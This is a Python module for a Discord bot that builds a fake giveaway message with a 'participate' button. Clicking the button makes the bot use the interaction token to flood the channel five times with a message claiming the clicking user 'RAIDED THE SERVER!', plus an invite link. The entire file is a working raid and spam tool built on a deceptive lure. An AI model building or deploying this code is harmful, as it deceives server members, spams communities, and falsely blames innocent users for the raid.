import asyncio
import aiohttp
import discord
import time
import random
from utils.helpers import send_message_http, ZNE_INVITE

def make_fake_giveaway(prize: str):
    future_ts = int(time.time()) + random.randint(3600, 86400)
    winners_count = random.randint(1, 4)
    
    class FakeGiveawayView(discord.ui.LayoutView):
        container1 = discord.ui.Container(
            discord.ui.TextDisplay(content=f"## {prize}\n**duration**: <t:{future_ts}:R>\n**winners**: `{winners_count}`"),
            discord.ui.ActionRow(
                discord.ui.Button(
                    style=discord.ButtonStyle.success,
                    label="participate",
                    custom_id="cc48a5731ba6493a9af170e49ebb42d8",
                ),
            ),
            accent_colour=discord.Colour(16777215),
        )

        async def interaction_check(self, interaction: discord.Interaction) -> bool:
            if interaction.data.get("custom_id") == "cc48a5731ba6493a9af170e49ebb42d8":
                await interaction.response.defer()
                
                user_mention = interaction.user.mention
                app_id = interaction.client.application_id
                token = interaction.token
                content = f"{user_mention} RAIDED THE SERVER! {ZNE_INVITE}"
                
                async with aiohttp.ClientSession() as session:
                    tasks = [
                        send_message_http(session, app_id, token, content)
                        for _ in range(5)
                    ]
                    await asyncio.gather(*tasks)
                
                return False
            return True

    return FakeGiveawayView()